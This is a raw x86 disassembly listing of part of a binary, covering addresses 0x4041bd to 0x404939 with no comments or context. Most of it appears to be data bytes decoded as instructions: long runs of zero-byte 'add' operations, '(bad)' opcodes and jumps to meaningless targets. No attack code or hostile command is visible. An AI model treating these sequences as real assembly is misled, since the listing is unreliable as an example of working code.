  4041bd:	add    cl,bl
  4041bf:	add    DWORD PTR [eax],eax
  4041c1:	add    BYTE PTR ds:0x47006100,cl
  4041c7:	add    BYTE PTR [ebx],al
  4041c9:	add    DWORD PTR [eax],eax
  4041cb:	add    dl,dh
  4041cd:	add    DWORD PTR [eax],eax
  4041cf:	add    BYTE PTR [ecx],cl
  4041d1:	add    BYTE PTR [edi+0x0],ah
  4041d4:	inc    edi
  4041d5:	add    BYTE PTR [ebx],al
  4041d7:	add    BYTE PTR [eax],dl
  4041d9:	add    BYTE PTR [ebx+0x0],dh
  4041dc:	add    BYTE PTR [eax],al
  4041de:	add    eax,0x47007000
  4041e3:	add    BYTE PTR [ecx],al
  4041e5:	add    DWORD PTR [eax],eax
  4041e7:	add    BYTE PTR [edi],al
  4041e9:	add    bl,BYTE PTR ds:0x70000902
  4041ef:	add    BYTE PTR [eax+0x0],bl
  4041f2:	add    BYTE PTR [ecx],al
  4041f4:	adc    BYTE PTR [eax],al
  4041f6:	cmp    eax,0x500cf02
  4041fb:	add    BYTE PTR [edi+0x0],dh
  4041fe:	pop    eax
  4041ff:	add    BYTE PTR [ebx],al
  404201:	add    BYTE PTR [eax],dl
  404203:	add    BYTE PTR [ebx+0x0],dh
  404206:	add    BYTE PTR [eax],al
  404208:	add    eax,0x60007800
  40420d:	add    BYTE PTR [eax],al
  40420f:	add    BYTE PTR [eax],al
  404211:	add    BYTE PTR [ebp+0x1b],bh
  404214:	add    BYTE PTR [eax],al
  404216:	add    eax,0x62007800
  40421b:	add    BYTE PTR [esi],al
  40421d:	add    BYTE PTR [edx+0x6000a02],ch
  404223:	add    BYTE PTR [esi+0x6000a02],ch
  404229:	add    cl,al
  40422b:	add    cl,BYTE PTR ds:0xcf000600
  404231:	add    cl,BYTE PTR [edx]
  404233:	add    BYTE PTR [esi],al
  404235:	add    bh,dl
  404237:	add    cl,BYTE PTR ds:0xdd000600
  40423d:	add    cl,BYTE PTR ds:0xe5000600
  404243:	add    cl,BYTE PTR [edx]
  404245:	add    BYTE PTR [ecx],dl
  404247:	add    BYTE PTR [ecx+0x6000d03],dl
  40424d:	push   es
  40424e:	xchg   ecx,eax
  40424f:	add    al,0x76
  404251:	add    BYTE PTR [esi-0x80],dl
  404254:	cdq    
  404255:	add    al,0x79
  404257:	add    BYTE PTR [esi-0x80],dl
  40425a:	scas   al,BYTE PTR es:[edi]
  40425b:	add    al,0x79
  40425d:	add    BYTE PTR [esi-0x80],dl
  404260:	les    eax,FWORD PTR [ecx+edi*2]
  404263:	add    BYTE PTR [esi-0x80],dl
  404266:	fadd   DWORD PTR [ecx+edi*2]
  404269:	add    BYTE PTR [esi-0x80],dl
  40426c:	out    dx,eax
  40426d:	add    al,0x79
  40426f:	add    BYTE PTR [esi-0x80],dl
  404272:	add    al,0x5
  404274:	jns    0x404276
  404276:	push   esi
  404277:	sbb    BYTE PTR [eax*1-0x7fa9ff87],0x2d
  40427f:	add    eax,0x80560079
  404284:	ds add eax,0x80560079
  40428a:	dec    edi
  40428b:	add    eax,0x80560079
  404290:	pusha  
  404291:	add    eax,0x80560079
  404296:	js     0x40429d
  404298:	jns    0x40429a
  40429a:	push   esi
  40429b:	or     BYTE PTR [ecx+0x56007905],0x80
  4042a2:	mov    ds:0x56007905,al
  4042a7:	cmp    BYTE PTR [esi+0x56007905],0x80
  4042ae:	aam    0x5
  4042b0:	jns    0x4042b2
  4042b2:	push   esi
  4042b3:	and    bh,0x5
  4042b6:	jns    0x4042b8
  4042b8:	push   esi
  4042b9:	cmp    cl,0x5
  4042bc:	jns    0x4042be
  4042be:	push   esi
  4042bf:	adc    BYTE PTR ds:0x56007906,0x80
  4042c6:	and    eax,DWORD PTR [esi]
  4042c8:	jns    0x4042ca
  4042ca:	push   esi
  4042cb:	xor    BYTE PTR [ecx],0x6
  4042ce:	jns    0x4042d0
  4042d0:	add    eax,DWORD PTR [eax]
  4042d2:	cmp    al,0x6
  4042d4:	out    0x0,al
  4042d6:	add    eax,DWORD PTR [eax]
  4042d8:	inc    ebp
  4042d9:	push   es
  4042da:	out    0x0,al
  4042dc:	add    eax,DWORD PTR [eax]
  4042de:	dec    esi
  4042df:	push   es
  4042e0:	out    0x0,al
  4042e2:	add    eax,DWORD PTR [eax]
  4042e4:	push   esi
  4042e5:	push   es
  4042e6:	out    0x0,al
  4042e8:	add    eax,DWORD PTR [eax]
  4042ea:	push   0x6
  4042ec:	out    0x0,al
  4042ee:	add    eax,DWORD PTR [eax]
  4042f0:	ja     0x4042f8
  4042f2:	out    0x0,al
  4042f4:	add    eax,DWORD PTR [eax]
  4042f6:	xchg   BYTE PTR [esi],al
  4042f8:	out    0x0,al
  4042fa:	add    DWORD PTR [eax],eax
  4042fc:	lea    eax,[esi]
  4042fe:	jmp    0x99404603
  404303:	push   es
  404304:	in     al,dx
  404305:	add    BYTE PTR [ecx],dl
  404307:	add    BYTE PTR [eax],bh
  404309:	pop    es
  40430a:	sbb    eax,DWORD PTR [ecx]
  40430c:	adc    DWORD PTR [eax],eax
  40430e:	gs pop es
  404310:	pop    ds
  404311:	add    DWORD PTR [ecx-0x80],edx
  404314:	ror    BYTE PTR [ecx],cl
  404316:	jbe    0x404318
  404318:	push   ecx
  404319:	sub    bl,0x9
  40431c:	jbe    0x40431e
  40431e:	push   ecx
  40431f:	add    BYTE PTR [ecx],0xa
  404322:	jbe    0x404324
  404324:	push   ecx
  404325:	and    BYTE PTR [ecx],0xa
  404328:	jbe    0x40432a
  40432a:	push   ecx
  40432b:	xor    BYTE PTR [edi],0xa
  40432e:	jbe    0x404330
  404330:	push   ecx
  404331:	adc    BYTE PTR [esi+0xa],0x76
  404335:	add    BYTE PTR [ecx-0x80],dl
  404338:	jne    0x404344
  40433a:	jbe    0x40433c
  40433c:	push   ecx
  40433d:	or     BYTE PTR [edi+0x5100760a],0x80
  404344:	scas   eax,DWORD PTR es:[edi]
  404345:	or     dh,BYTE PTR [esi+0x0]
  404348:	push   ecx
  404349:	adc    ah,0xa
  40434c:	jbe    0x40434e
  40434e:	push   ecx
  40434f:	xor    dl,0xa
  404352:	jbe    0x404354
  404354:	push   ecx
  404355:	or     BYTE PTR [eax],0xb
  404358:	jbe    0x40435a
  40435a:	push   ecx
  40435b:	sbb    BYTE PTR ds:0x5100760b,0x80
  404362:	cmp    ecx,DWORD PTR [ebx]
  404364:	jbe    0x404366
  404366:	push   ecx
  404367:	adc    BYTE PTR [ebx+ecx*1+0x76],0x0
  40436c:	push   ecx
  40436d:	xor    BYTE PTR [eax+0xb],0x76
  404371:	add    BYTE PTR [ecx-0x80],dl
  404374:	mov    BYTE PTR [ebx],cl
  404376:	jbe    0x404378
  404378:	push   es
  404379:	push   es
  40437a:	xchg   ecx,eax
  40437b:	add    al,0x76
  40437d:	add    BYTE PTR [esi-0x80],dl
  404380:	sub    DWORD PTR ds:0x805601f5,ecx
  404386:	inc    ebx
  404387:	or     eax,0x805601f5
  40438c:	pop    edx
  40438d:	or     eax,0x60601f5
  404392:	xchg   ecx,eax
  404393:	add    al,0x76
  404395:	add    BYTE PTR [esi-0x80],dl
  404398:	je     0x4043a7
  40439a:	stc    
  40439b:	add    DWORD PTR [esi-0x80],edx
  40439e:	or     BYTE PTR ds:0x805601f9,0x8d
  4043a5:	or     eax,0x805601f9
  4043aa:	fwait
  4043ab:	or     eax,0x805601f9
  4043b0:	test   al,0xd
  4043b2:	stc    
  4043b3:	add    DWORD PTR [esi-0x80],edx
  4043b6:	mov    esi,0x5601f90d
  4043bb:	adc    ah,0xd
  4043be:	stc    
  4043bf:	add    DWORD PTR [esi-0x80],edx
  4043c2:	jecxz  0x4043d1
  4043c4:	stc    
  4043c5:	add    DWORD PTR [esi-0x80],edx
  4043c8:	repnz or eax,0x601f9
  4043ce:	add    cl,BYTE PTR [esi]
  4043d0:	adc    DWORD PTR [edx],eax
  4043d2:	push   es
  4043d3:	adc    BYTE PTR [edi],dl
  4043d5:	push   cs
  4043d6:	or     al,BYTE PTR [eax]
  4043d8:	push   es
  4043d9:	adc    BYTE PTR ds:0x6000a0e,ah
  4043df:	add    BYTE PTR ds:0x602150e,dh
  4043e5:	adc    BYTE PTR [esi+ecx*1+0xd],al
  4043e9:	add    BYTE PTR [esi],al
  4043eb:	adc    BYTE PTR [edx+0xe],ah
  4043ee:	or     eax,0x6f000600
  4043f3:	push   cs
  4043f4:	adc    DWORD PTR [edx],eax
  4043f6:	push   es
  4043f7:	add    BYTE PTR [esi+0x600760e],al
  4043fd:	add    BYTE PTR [edi+0x600760e],dl
  404403:	add    BYTE PTR [ebp+0x600760e],ah
  404409:	add    BYTE PTR [esi+ecx*1+0x600e6],dh
  404410:	mov    ebx,0x600ec0e
  404415:	add    al,al
  404417:	push   cs
  404418:	out    0x0,al
  40441a:	push   es
  40441b:	add    dh,cl
  40441d:	push   cs
  40441e:	sbb    DWORD PTR [edx],eax
  404420:	push   es
  404421:	add    dh,bl
  404423:	push   cs
  404424:	sbb    DWORD PTR [edx],eax
  404426:	push   es
  404427:	add    dh,ch
  404429:	push   cs
  40442a:	sbb    DWORD PTR [edx],eax
  40442c:	push   es
  40442d:	add    dl,bh
  40442f:	push   cs
  404430:	out    0x0,al
  404432:	push   es
  404433:	add    BYTE PTR [ebx],cl
  404435:	(bad)  
  404437:	add    BYTE PTR [esi],al
  404439:	add    BYTE PTR [ecx],ah
  40443b:	paddsb mm0,QWORD PTR [eax]
  40443e:	push   es
  40443f:	push   es
  404440:	xchg   ecx,eax
  404441:	add    al,0x76
  404443:	add    BYTE PTR [esi-0x80],dl
  404446:	xor    DWORD PTR [edi],ecx
  404448:	sbb    eax,0x4b805602
  40444d:	nop    DWORD PTR [edx]
  404450:	push   esi
  404451:	and    BYTE PTR [ebp+0xf],0x1d
  404455:	add    al,BYTE PTR [esi]
  404457:	add    BYTE PTR [esi+0xf],bh
  40445a:	and    DWORD PTR [edx],eax
  40445c:	push   es
  40445d:	add    BYTE PTR [ecx+0x602250f],cl
  404463:	add    BYTE PTR [edi+0x602250f],cl
  404469:	add    BYTE PTR [ebp+0x602250f],dl
  40446f:	add    BYTE PTR [ebx+0x602250f],bl
  404475:	add    BYTE PTR [ecx+0x602250f],ah
  40447b:	add    BYTE PTR [edi+0x602250f],ah
  404481:	push   es
  404482:	xchg   ecx,eax
  404483:	add    al,0x76
  404485:	add    BYTE PTR [esi-0x80],dl
  404488:	lods   eax,DWORD PTR ds:[esi]
  404489:	movaps xmm0,XMMWORD PTR [edx]
  40448c:	push   esi
  40448d:	add    cl,0xf
  404490:	sub    BYTE PTR [edx],al
  404492:	push   esi
  404493:	sbb    cl,0xf
  404496:	sub    BYTE PTR [edx],al
  404498:	push   esi
  404499:	sub    bh,0xf
  40449c:	sub    BYTE PTR [edx],al
  40449e:	push   esi
  40449f:	or     BYTE PTR ds:0x56022810,0x80
  4044a6:	sub    DWORD PTR [eax],edx
  4044a8:	sub    BYTE PTR [edx],al
  4044aa:	push   esi
  4044ab:	or     BYTE PTR [ecx+0x10],0x28
  4044af:	add    dl,BYTE PTR [esi-0x80]
  4044b2:	adc    BYTE PTR [bx+si],ch
  4044b5:	add    al,BYTE PTR [esi]
  4044b7:	push   es
  4044b8:	xchg   ecx,eax
  4044b9:	add    al,0x76
  4044bb:	add    BYTE PTR [esi-0x80],dl
  4044be:	(bad)  
  4044bf:	adc    ecx,eax
  4044c1:	add    dl,BYTE PTR [esi-0x80]
  4044c4:	iret   
  4044c5:	adc    ecx,eax
  4044c7:	add    dl,BYTE PTR [esi-0x80]
  4044ca:	loopne 0x4044dd
  4044cc:	rol    DWORD PTR [edx],0x56
  4044cf:	xor    al,0x11
  4044d2:	rol    DWORD PTR [edx],0x56
  4044d5:	or     BYTE PTR [ecx],0x12
  4044d8:	rol    DWORD PTR [edx],0x56
  4044db:	sbb    BYTE PTR ds:0x5102c112,0x80
  4044e2:	sub    dl,BYTE PTR [edx]
  4044e4:	or     al,BYTE PTR [eax]
  4044e6:	adc    eax,DWORD PTR [eax]
  4044e8:	add    eax,0x1304001c
  4044ed:	add    dh,ch
  4044ef:	sbb    eax,0x20d00400
  4044f4:	add    BYTE PTR [eax],al
  4044f6:	add    BYTE PTR [eax],al
  4044f8:	xchg   BYTE PTR [eax],bl
  4044fa:	in     eax,dx
  4044fb:	add    dl,BYTE PTR [eax]
  4044fd:	add    BYTE PTR [ecx],al
  4044ff:	add    BYTE PTR [eax],al
  404501:	add    BYTE PTR [eax],al
  404503:	add    BYTE PTR [eax-0xcdf6a00],al
  404509:	add    dl,BYTE PTR [eax+eax*1]
  40450c:	add    DWORD PTR [eax],eax
  40450e:	add    BYTE PTR [eax],al
  404510:	add    BYTE PTR [eax],al
  404512:	add    BYTE PTR [eax],0x91
  404515:	and    BYTE PTR [ebx],cl
  404517:	add    ebx,DWORD PTR [edx]
  404519:	add    BYTE PTR [ebx],al
  40451b:	add    BYTE PTR [eax],al
  40451d:	add    BYTE PTR [eax],al
  40451f:	add    BYTE PTR [eax+0x2b209100],al
  404525:	add    ebx,DWORD PTR [edx]
  404527:	add    BYTE PTR [ebx],al
  404529:	add    BYTE PTR [ecx+eiz*1],al
  40452c:	add    BYTE PTR [eax],al
  40452e:	add    BYTE PTR [eax],al
  404530:	xchg   esi,eax
  404531:	add    BYTE PTR [ebx+eax*1+0x1e],dl
  404535:	add    BYTE PTR [ebx],al
  404537:	add    BYTE PTR [eax],dl
  404539:	and    DWORD PTR [eax],eax
  40453b:	add    BYTE PTR [eax],al
  40453d:	add    BYTE PTR [esi+0x1e036e00],dl
  404543:	add    BYTE PTR [ebx],al
  404545:	add    BYTE PTR [ecx+eiz*1],bl
  404548:	add    BYTE PTR [eax],al
  40454a:	add    BYTE PTR [eax],al
  40454c:	xchg   ecx,eax
  40454d:	add    BYTE PTR [ebp+0x3002b03],bh
  404553:	add    BYTE PTR [eax+0x21],dl
  404556:	add    BYTE PTR [eax],al
  404558:	add    BYTE PTR [eax],al
  40455a:	xchg   ecx,eax
  40455b:	add    al,ah
  40455d:	add    esi,DWORD PTR [eax]
  40455f:	add    BYTE PTR [ebx],al
  404561:	add    BYTE PTR [eax+0x21],cl
  404567:	add    BYTE PTR [ecx+0x3603f100],dl
  40456d:	add    BYTE PTR [eax+eax*1],al
  404570:	pop    eax
  404571:	and    al,0x0
  404573:	add    BYTE PTR [eax],al
  404575:	add    BYTE PTR [ecx+0x3c03f600],dl
  40457b:	add    BYTE PTR ds:0x245a00,al
  404581:	add    BYTE PTR [eax],al
  404583:	add    BYTE PTR [ecx+0x40040700],dl
  404589:	add    BYTE PTR ds:0x246400,al
  40458f:	add    BYTE PTR [eax],al
  404591:	add    BYTE PTR [ecx+0x40041300],dl
  404597:	add    BYTE PTR [esi],al
  404599:	add    BYTE PTR [esp+0x0],bh
  4045a0:	xchg   ecx,eax
  4045a1:	add    BYTE PTR [esi],ch
  4045a3:	add    al,0x45
  4045a5:	add    BYTE PTR [edi],al
  4045a7:	add    BYTE PTR [edx],bl
  4045a9:	daa    
  4045aa:	add    BYTE PTR [eax],al
  4045ac:	add    BYTE PTR [eax],al
  4045ae:	xchg   ecx,eax
  4045af:	add    BYTE PTR [eax+0x4],cl
  4045b2:	dec    edi
  4045b3:	add    BYTE PTR [ecx],cl
  4045b5:	add    BYTE PTR [ebp+0x27],al
  4045b8:	add    BYTE PTR [eax],al
  4045ba:	add    BYTE PTR [eax],al
  4045bc:	xchg   ecx,eax
  4045bd:	add    BYTE PTR [esi+0x4],dl
  4045c0:	pop    ecx
  4045c1:	add    BYTE PTR ds:0x275d00,cl
  4045c7:	add    BYTE PTR [eax],al
  4045c9:	add    BYTE PTR [esi+0x1002ed18],al
  4045cf:	add    BYTE PTR [edi],cl
  4045d1:	add    BYTE PTR [ebx+0x27],bl
  4045d4:	add    BYTE PTR [eax],al
  4045d6:	add    BYTE PTR [eax],al
  4045d8:	xchg   ecx,eax
  4045d9:	sbb    BYTE PTR [eax],dh
  4045db:	push   ds
  4045dc:	cmp    al,0x0
  4045de:	sldt   WORD PTR [eax]
  4045e1:	add    BYTE PTR [eax],al
  4045e3:	add    BYTE PTR [eax],al
  4045e5:	add    BYTE PTR [ebx+0x5f046d20],dl
  4045eb:	add    BYTE PTR [edi],cl
  4045ed:	add    BYTE PTR [eax+0x27],ch
  4045f0:	add    BYTE PTR [eax],al
  4045f2:	add    BYTE PTR [eax],al
  4045f4:	xchg   ebx,eax
  4045f5:	add    BYTE PTR [ecx+0x4],bh
  4045f8:	imul   eax,DWORD PTR [eax],0x13
  4045fb:	add    dh,al
  4045fd:	daa    
  4045fe:	add    BYTE PTR [eax],al
  404600:	add    BYTE PTR [eax],al
  404602:	xchg   BYTE PTR [eax],bl
  404604:	in     eax,dx
  404605:	add    dl,BYTE PTR [eax]
  404607:	add    BYTE PTR [edi],dl
  404609:	add    BYTE PTR [eax],al
  40460b:	add    BYTE PTR [eax],al
  40460d:	add    BYTE PTR [eax],al
  40460f:	add    dh,al
  404611:	add    eax,0xef069e
  404616:	pop    ss
  404617:	add    BYTE PTR [eax],al
  404619:	add    BYTE PTR [eax],al
  40461b:	add    BYTE PTR [eax],al
  40461d:	add    dh,al
  40461f:	add    eax,0xf306e1
  404624:	pop    ss
  404625:	add    BYTE PTR [eax],al
  404627:	add    BYTE PTR [eax],al
  404629:	add    BYTE PTR [eax-0x12fa3a00],al
  40462f:	push   es
  404630:	cli    
  404631:	add    BYTE PTR [ecx],bl
  404633:	add    BYTE PTR [eax],al
  404635:	add    BYTE PTR [eax],al
  404637:	add    BYTE PTR [eax+0x1005c600],al
  40463d:	pop    es
  40463e:	pop    es
  40463f:	add    DWORD PTR [esi],ebx
  404641:	add    dh,cl
  404643:	daa    
  404644:	add    BYTE PTR [eax],al
  404646:	add    BYTE PTR [eax],al
  404648:	sbb    DWORD PTR [eax],0xffffffed
  40464b:	add    dl,BYTE PTR [eax]
  40464d:	add    BYTE PTR [esi],ah
  40464f:	add    al,bl
  404651:	daa    
  404652:	add    BYTE PTR [eax],al
  404654:	add    BYTE PTR [eax],al
  404656:	xchg   ebx,eax
  404657:	or     BYTE PTR [ebp+0x7],dh
  40465a:	and    eax,DWORD PTR [ecx]
  40465c:	add    BYTE PTR es:[edi],dl
  40465f:	sub    BYTE PTR [eax],al
  404661:	add    BYTE PTR [eax],al
  404663:	add    BYTE PTR [ebx+0x28078908],dl
  404669:	add    DWORD PTR [esi],esp
  40466b:	add    BYTE PTR [esi],bl
  40466d:	sub    BYTE PTR [eax],al
  40466f:	add    BYTE PTR [eax],al
  404671:	add    BYTE PTR [ebx+0x2d079508],dl
  404677:	add    DWORD PTR [esi],esp
  404679:	add    BYTE PTR [esi],ah
  40467b:	sub    BYTE PTR [eax],al
  40467d:	add    BYTE PTR [eax],al
  40467f:	add    BYTE PTR [ebx+0x1e07a108],dl
  404685:	add    BYTE PTR [edi],ah
  404687:	add    BYTE PTR [eax+ebp*1],bh
  40468a:	add    BYTE PTR [eax],al
  40468c:	add    BYTE PTR [eax],al
  40468e:	xchg   ebx,eax
  40468f:	or     BYTE PTR [esi+0x27001e07],dh
  404695:	add    BYTE PTR [edx+0x28],dl
  404698:	add    BYTE PTR [eax],al
  40469a:	add    BYTE PTR [eax],al
  40469c:	xchg   ebx,eax
  40469d:	or     dl,cl
  40469f:	pop    es
  4046a0:	push   ds
  4046a1:	add    BYTE PTR [edi],ah
  4046a3:	add    BYTE PTR [eax+0x28],ch
  4046a6:	add    BYTE PTR [eax],al
  4046a8:	add    BYTE PTR [eax],al
  4046aa:	xchg   ebx,eax
  4046ab:	or     dh,ah
  4046ad:	pop    es
  4046ae:	push   ds
  4046af:	add    BYTE PTR [edi],ah
  4046b1:	add    BYTE PTR [esi+0x28],bh
  4046b4:	add    BYTE PTR [eax],al
  4046b6:	add    BYTE PTR [eax],al
  4046b8:	xchg   ebx,eax
  4046b9:	or     bh,bh
  4046bb:	pop    es
  4046bc:	push   ds
  4046bd:	add    BYTE PTR [edi],ah
  4046bf:	add    BYTE PTR [eax+ebp*1+0x0],dl
  4046c6:	xchg   ebx,eax
  4046c7:	or     BYTE PTR [edx],bl
  4046c9:	or     BYTE PTR [esi],bl
  4046cb:	add    BYTE PTR [edi],ah
  4046cd:	add    BYTE PTR [edx+0x28],ch
  4046d3:	add    BYTE PTR [ebx+0x1e082d08],dl
  4046d9:	add    BYTE PTR [edi],ah
  4046db:	add    al,al
  4046dd:	sub    BYTE PTR [eax],al
  4046df:	add    BYTE PTR [eax],al
  4046e1:	add    BYTE PTR [ebx+0x1e084708],dl
  4046e7:	add    BYTE PTR [edi],ah
  4046e9:	add    dh,dl
  4046eb:	sub    BYTE PTR [eax],al
  4046ed:	add    BYTE PTR [eax],al
  4046ef:	add    BYTE PTR [ebx+0x1e086208],dl
  4046f5:	add    BYTE PTR [edi],ah
  4046f7:	add    ah,ch
  4046f9:	sub    BYTE PTR [eax],al
  4046fb:	add    BYTE PTR [eax],al
  4046fd:	add    BYTE PTR [ebx+0x1e087f08],dl
  404703:	add    BYTE PTR [edi],ah
  404705:	add    BYTE PTR [edx],al
  404707:	sub    DWORD PTR [eax],eax
  404709:	add    BYTE PTR [eax],al
  40470b:	add    BYTE PTR [esi+0x41096b08],dl
  404711:	add    DWORD PTR [edi],esp
  404713:	add    BYTE PTR [ecx],cl
  404715:	sub    DWORD PTR [eax],eax
  404717:	add    BYTE PTR [eax],al
  404719:	add    BYTE PTR [ecx+0x1002ed18],al
  40471f:	add    BYTE PTR [edi],ah
  404721:	add    BYTE PTR ds:0x29,bl
  404727:	add    BYTE PTR [esi+0x4602ed18],al
  40472d:	add    DWORD PTR [edi],esp
  40472f:	add    BYTE PTR [edx],dh
  404731:	sub    DWORD PTR [eax],eax
  404733:	add    BYTE PTR [eax],al
  404735:	add    BYTE PTR [esi+0x4b02ed18],al
  40473b:	add    DWORD PTR [eax],ebp
  40473d:	add    BYTE PTR [edi+0x29],al
  404740:	add    BYTE PTR [eax],al
  404742:	add    BYTE PTR [eax],al
  404744:	add    DWORD PTR [eax],0x75
  404747:	or     DWORD PTR [eax+0x1],edx
  40474a:	sub    DWORD PTR [eax],eax
  40474c:	push   edi
  40474d:	sub    DWORD PTR [eax],eax
  40474f:	add    BYTE PTR [eax],al
  404751:	add    BYTE PTR [ebx+0x58097a00],al
  404757:	add    DWORD PTR [eax+eax*1],ebp
  40475a:	je     0x404785
  40475c:	add    BYTE PTR [eax],al
  40475e:	add    BYTE PTR [eax],al
  404760:	add    DWORD PTR [eax],0xffffff8b
  404763:	or     DWORD PTR [esi+0x1],ebx
  404766:	add    BYTE PTR cs:[eax+0x29],dl
  40476d:	add    ah,al
  40476f:	add    BYTE PTR [eax+0x2e016409],ah
  404775:	add    BYTE PTR [ecx+ebp*1+0x0],ch
  40477c:	sbb    DWORD PTR [eax],0x1002ed
  404782:	cs add al,al
  404785:	sub    DWORD PTR [eax],eax
  404787:	add    BYTE PTR [eax],al
  404789:	add    BYTE PTR [esi+0x6d02ed18],al
  40478f:	add    DWORD PTR [esi],ebp
  404791:	add    al,dl
  404793:	sub    DWORD PTR [eax],eax
  404795:	add    BYTE PTR [eax],al
  404797:	add    BYTE PTR [ebx+0x7209b408],al
  40479d:	add    DWORD PTR [edi],ebp
  40479f:	add    BYTE PTR [eax],al
  4047a1:	add    BYTE PTR [eax],al
  4047a3:	add    BYTE PTR [eax-0x40df6f00],al
  4047a9:	or     DWORD PTR [esi+0x1],esi
  4047ac:	das    
  4047ad:	add    al,bl
  4047af:	sub    DWORD PTR [eax],eax
  4047b1:	add    BYTE PTR [eax],al
  4047b3:	add    ah,al
  4047b5:	add    BYTE PTR [eax+0x30016409],ah
  4047bb:	add    ah,ch
  4047bd:	sub    DWORD PTR [eax],eax
  4047bf:	add    BYTE PTR [eax],al
  4047c1:	add    BYTE PTR [ebx+0x1e0ba500],dl
  4047c7:	add    BYTE PTR [eax],dh
  4047c9:	add    BYTE PTR [edx+ebp*1],cl
  4047cc:	add    BYTE PTR [eax],al
  4047ce:	add    BYTE PTR [eax],al
  4047d0:	xchg   esi,eax
  4047d1:	add    BYTE PTR [eax+0x30019d0b],bh
  4047d7:	add    BYTE PTR [eax],al
  4047d9:	sub    eax,DWORD PTR [eax]
  4047db:	add    BYTE PTR [eax],al
  4047dd:	add    BYTE PTR [esi-0x5bf43100],dl
  4047e3:	add    DWORD PTR [edx],esi
  4047e5:	add    BYTE PTR [ebx+ebp*1],dl
  4047e8:	add    BYTE PTR [eax],al
  4047ea:	add    BYTE PTR [eax],al
  4047ec:	xchg   ebx,eax
  4047ed:	add    ch,bl
  4047ef:	or     esp,DWORD PTR [ecx+eax*1+0x2c4c0033]
  4047f6:	add    BYTE PTR [eax],al
  4047f8:	add    BYTE PTR [eax],al
  4047fa:	xchg   esi,eax
  4047fb:	add    ch,ch
  4047fd:	or     ebp,DWORD PTR [ecx-0x27ffcbff]
  404803:	sub    al,0x0
  404805:	add    BYTE PTR [eax],al
  404807:	add    BYTE PTR [ecx-0x4ef3fd00],dl
  40480d:	add    DWORD PTR [edi],esi
  40480f:	add    BYTE PTR [eax],ah
  404811:	sub    eax,0x0
  404816:	xchg   ecx,eax
  404817:	add    BYTE PTR [esi+0xc],al
  40481a:	mov    ch,0x1
  40481c:	aaa    
  40481d:	add    BYTE PTR [ebp+ebp*1+0x0],dl
  404821:	add    BYTE PTR [eax],al
  404823:	add    BYTE PTR [esi-0x43f3ae00],dl
  404829:	add    DWORD PTR [eax],edi
  40482b:	add    al,bh
  40482d:	sub    eax,0x0
  404832:	xchg   esi,eax
  404833:	add    BYTE PTR [edi+0xc],ah
  404836:	ret    
  404837:	add    DWORD PTR [ebx],edi
  404839:	add    BYTE PTR [eax+0x2e],dh
  40483f:	add    BYTE PTR [esi-0x32f39900],dl
  404845:	add    DWORD PTR [edi],edi
  404847:	add    al,cl
  404849:	add    BYTE PTR cs:[eax],al
  40484c:	add    BYTE PTR [eax],al
  40484e:	xchg   esi,eax
  40484f:	add    BYTE PTR [esp+ecx*1-0x5c],dh
  404853:	add    DWORD PTR [edx+0x0],eax
  404856:	pop    esp
  404857:	das    
  404858:	add    BYTE PTR [eax],al
  40485a:	add    BYTE PTR [eax],al
  40485c:	xchg   esi,eax
  40485d:	add    BYTE PTR [edi+0xc],bh
  404860:	aad    0x1
  404862:	inc    ebx
  404863:	add    BYTE PTR [eax+esi*1+0x0],al
  404867:	add    BYTE PTR [eax],al
  404869:	add    BYTE PTR [ecx-0x23f38100],dl
  40486f:	add    DWORD PTR [ebp+0x0],eax
  404872:	les    esi,FWORD PTR [eax]
  404874:	add    BYTE PTR [eax],al
  404876:	add    BYTE PTR [eax],al
  404878:	xchg   esi,eax
  404879:	add    BYTE PTR [edx+0x4601e20c],ah
  40487f:	add    BYTE PTR [ecx+esi*1],cl
  404882:	add    BYTE PTR [eax],al
  404884:	add    BYTE PTR [eax],al
  404886:	xchg   esi,eax
  404887:	add    BYTE PTR [edx+0x4701a40c],bh
  40488d:	add    BYTE PTR [eax+0x31],al
  404893:	add    BYTE PTR [esi-0x5bf32f00],dl
  404899:	add    DWORD PTR [eax+0x0],ecx
  40489c:	sub    BYTE PTR [edx],dh
  40489e:	add    BYTE PTR [eax],al
  4048a0:	add    BYTE PTR [eax],al
  4048a2:	xchg   esi,eax
  4048a3:	add    dl,ah
  4048a5:	or     al,0xe8
  4048a7:	add    DWORD PTR [ecx+0x0],ecx
  4048aa:	shl    BYTE PTR [edx],0x0
  4048ad:	add    BYTE PTR [eax],al
  4048af:	add    BYTE PTR [esi-0x10f2f200],dl
  4048b5:	add    DWORD PTR [ebx+0x0],ecx
  4048b8:	hlt    
  4048b9:	xor    al,BYTE PTR [eax]
  4048bb:	add    BYTE PTR [eax],al
  4048bd:	add    BYTE PTR [esi-0x5bf2e300],dl
  4048c3:	add    DWORD PTR [eax+eax*1+0x0],ecx
  4048c7:	add    BYTE PTR [eax],al
  4048c9:	add    BYTE PTR [eax-0x72df6d00],al
  4048cf:	adc    BYTE PTR [edx+eax*1],ch
  4048d2:	dec    ebp
  4048d3:	add    BYTE PTR [eax],al
  4048d5:	add    BYTE PTR [eax],al
  4048d7:	add    BYTE PTR [eax-0x5edf6d00],al
  4048dd:	adc    BYTE PTR [eax],bh
  4048df:	add    dl,BYTE PTR [edx+0x0]
  4048e2:	add    BYTE PTR [eax],al
  4048e4:	add    BYTE PTR [eax],al
  4048e6:	add    BYTE PTR [eax],0x93
  4048e9:	and    ch,al
  4048eb:	adc    BYTE PTR [edx+eax*1+0x58],al
  4048ef:	add    BYTE PTR [eax],al
  4048f1:	add    BYTE PTR [eax],al
  4048f3:	add    BYTE PTR [eax-0x28df6d00],al
  4048f9:	adc    BYTE PTR [ebp+0x2],dl
  4048fc:	pop    edi
  4048fd:	add    BYTE PTR [eax],al
  4048ff:	add    BYTE PTR [eax],al
  404901:	add    BYTE PTR [eax-0x17df6d00],al
  404907:	adc    BYTE PTR [edi+0x2],ah
  40490a:	data16 add BYTE PTR [eax],al
  40490d:	add    BYTE PTR [eax],al
  40490f:	add    BYTE PTR [eax+0x209300],al
  404915:	adc    DWORD PTR [edi+0x2],esp
  404918:	imul   eax,DWORD PTR [eax],0x0
  40491b:	add    BYTE PTR [eax],al
  40491d:	add    BYTE PTR [eax+0x18209300],al
  404923:	adc    DWORD PTR [edx+0x2],esi
  404926:	jo     0x404928
  404928:	add    BYTE PTR [eax],al
  40492a:	add    BYTE PTR [eax],al
  40492c:	add    BYTE PTR [eax],0x93
  40492f:	and    BYTE PTR ds:0x74027b11,ch
  404935:	add    BYTE PTR [eax],al
  404937:	add    BYTE PTR [eax],al
  404939:	add    BYTE PTR [eax+0x38209300],al
